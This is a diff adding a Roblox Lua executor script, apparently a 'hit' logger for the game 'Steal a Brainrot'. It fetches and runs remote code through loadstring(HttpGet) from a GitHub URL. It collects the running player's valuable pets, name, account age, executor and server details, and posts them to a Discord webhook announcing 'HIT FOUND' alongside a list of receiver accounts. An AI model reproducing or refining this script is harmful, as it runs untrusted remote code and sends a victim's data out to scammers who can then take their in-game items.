@@ -1,0 +1,218 @@
+-- Services
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local player = Players.LocalPlayer
+local localPlayer = player
+
+-- Parse price helper
+local function parsePrice(priceText)
+    local number = tonumber((priceText or ""):match("[%d%.]+")) or 0
+    if (priceText or ""):find("K") then
+        return number * 1000
+    elseif (priceText or ""):find("M") then
+        return number * 1000000
+    elseif (priceText or ""):find("B") then
+        return number * 1000000000
+    else
+        return number
+    end
+end
+
+-- Configuration (attempt to load remote config; fallback to defaults)
+local config = {}
+do
+    local ok, res = pcall(function()
+        return loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-IDP/tsetging234/refs/heads/main/config"))()
+    end)
+    if ok and type(res) == "table" then
+        config = res
+    else
+        config = {
+            WEBHOOK = "", -- put your webhook here if not loading remotely
+            PRICE_LIMIT = 0,
+            targetNames = {},
+            Displayname = "",
+            Receiver = {}
+        }
+    end
+end
+
+local WEBHOOK = config.WEBHOOK
+local PRICE_LIMIT = config.PRICE_LIMIT
+local targetNames = config.targetNames or {}
+local receiverList = table.concat(config.Receiver or {}, ", ")
+local badPlayers = config.Receiver or {}
+
+-- Priority & shuffle
+local function getPriority(name)
+    for _, t in ipairs(targetNames) do
+        if name and t.name and name:find(t.name) then
+            return t.priority
+        end
+    end
+    return math.huge
+end
+
+local function shuffle(tbl)
+    for i = #tbl, 2, -1 do
+        local j = math.random(i)
+        tbl[i], tbl[j] = tbl[j], tbl[i]
+    end
+end
+
+-- Collect valid pets (ONLY YOUR BASE)
+local function collectValidPets()
+    local pets = {}
+    local plots = Workspace:FindFirstChild("Plots")
+    if not plots then return pets end
+
+    for _, plot in pairs(plots:GetChildren()) do
+        local sign = plot:FindFirstChild("PlotSign")
+        if sign and sign:FindFirstChild("YourBase") and sign.YourBase.Enabled then
+            local podiums = plot:FindFirstChild("AnimalPodiums")
+            if podiums then
+                for _, podium in pairs(podiums:GetChildren()) do
+                    if podium:IsA("Model") then
+                        local num = tonumber(podium.Name:match("^(%d+)_?"))
+                        local floor = "Unknown Floor"
+                        if num then
+                            if num >= 1 and num <= 10 then
+                                floor = "1st Floor"
+                            elseif num >= 11 and num <= 18 then
+                                floor = "2nd Floor"
+                            else
+                                floor = "3rd Floor"
+                            end
+                        end
+
+                        local base = podium:FindFirstChild("Base")
+                        local spawn = base and base:FindFirstChild("Spawn")
+                        local attachment = spawn and spawn:FindFirstChild("Attachment")
+                        local overhead = attachment and attachment:FindFirstChild("AnimalOverhead")
+
+                        if overhead then
+                            local displayName = overhead:FindFirstChild("DisplayName")
+                            local priceLabel = overhead:FindFirstChild("Generation")
+                            if displayName and priceLabel and displayName:IsA("TextLabel") and priceLabel:IsA("TextLabel") then
+                                local nameText = displayName.Text
+                                local priceText = priceLabel.Text
+                                local priceNum = parsePrice(priceText)
+                                if priceNum >= PRICE_LIMIT or getPriority(nameText) ~= math.huge then
+                                    table.insert(pets, string.format("%s → %s → %s", nameText, priceText, floor))
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+            break -- stop after your base
+        end
+    end
+    return pets
+end
+
+-- Detect executor
+local function detectExecutor()
+    local executor = "Unknown"
+    if syn then executor = "Synapse X"
+    elseif KRNL_LOADED then executor = "KRNL"
+    elseif fluxus then executor = "Fluxus"
+    elseif secure_load then executor = "Sentinel"
+    elseif getexecutorname then executor = getexecutorname()
+    elseif identifyexecutor then executor = identifyexecutor() end
+    return executor
+end
+
+-- Get account age
+local function getAccountAge()
+    return player and player.AccountAge or 0
+end
+
+-- Detect server type
+local map = Workspace:FindFirstChild("Map")
+local serverType = "UNKNOWN"
+if map then
+    local codes = map:FindFirstChild("Codes")
+    if codes then
+        local main = codes:FindFirstChild("Main")
+        if main then
+            local surfaceGui = main:FindFirstChild("SurfaceGui")
+            if surfaceGui then
+                local sFrame = surfaceGui:FindFirstChild("MainFrame")
+                if sFrame then
+                    local privateMsg = sFrame:FindFirstChild("PrivateServerMessage")
+                    serverType = (privateMsg and privateMsg.Visible) and "PRIVATE SERVER" or "PUBLIC SERVER"
+                end
+            end
+        end
+    end
+end
+
+-- Send webhook (working)
+local function sendWebhook(link)
+    if player and player:GetAttribute("WebhookSent") then return end
+
+    local pets = collectValidPets()
+    local priorityPets, randomPets = {}, {}
+    for _, pet in ipairs(pets) do
+        local petName = pet:match("^(.-) →") or pet
+        local prio = getPriority(petName)
+        if prio ~= math.huge then
+            table.insert(priorityPets, {pet = pet, priority = prio})
+        else
+            table.insert(randomPets, pet)
+        end
+    end
+    table.sort(priorityPets, function(a, b) return a.priority < b.priority end)
+    shuffle(randomPets)
+
+    local orderedPets = {}
+    for _, p in ipairs(priorityPets) do table.insert(orderedPets, p.pet) end
+    for _, r in ipairs(randomPets) do table.insert(orderedPets, r) end
+
+    local lootText = #orderedPets > 0 and table.concat(orderedPets, "\n") or "No pets found"
+
+    local placeId = tostring(game.PlaceId or "")
+    local jobId = tostring(game.JobId or "")
+    local serverLink = ("https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s"):format(placeId, jobId)
+
+    local embed = {
+        ["title"] = "Sab Detector - test",
+        ["color"] = serverType == "PUBLIC SERVER" and 16711680 or 65280,
+        ["fields"] = {
+            { ["name"] = "Players", ["value"] = string.format("%d/6", #Players:GetPlayers()) },
+            { ["name"] = "Server Type", ["value"] = serverType },
+            { ["name"] = "👥 Player Information",
+              ["value"] = "Name: " .. (player and player.Name or "Unknown") ..
+                          "\nReceiver: ".. receiverList ..
+                          "\nExecutor: " .. detectExecutor() ..
+                          "\nAccount Age: " .. tostring(getAccountAge()) .. " days" },
+            { ["name"] = "🧠Brainrot Loot", ["value"] = lootText },
+            { ["name"] = "Join Server Link", ["value"] = ("[Click to Join Server](%s)"):format(serverLink) }
+        }
+    }
+
+    local payload = {
+        ["content"] = "📣 @everyone **HIT FOUND!!!!!**\n" .. (link or ("Server detected: " .. serverType)),
+        ["embeds"] = {embed},
+        ["allowed_mentions"] = { ["parse"] = {"everyone"} }
+    }
+
+    local req = (syn and syn.request) or http_request or (http and http.request) or request
+    if req and WEBHOOK and WEBHOOK ~= "" then
+        local success, err = pcall(function()
+            req({
+                Url = WEBHOOK,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(payload)
+            })
+        end)
+        if success and player then player:SetAttribute("WebhookSent", true) end
+    end
+end
+
+-- GUI + private server link logic omitted for brevity (keep your previous working GUI)
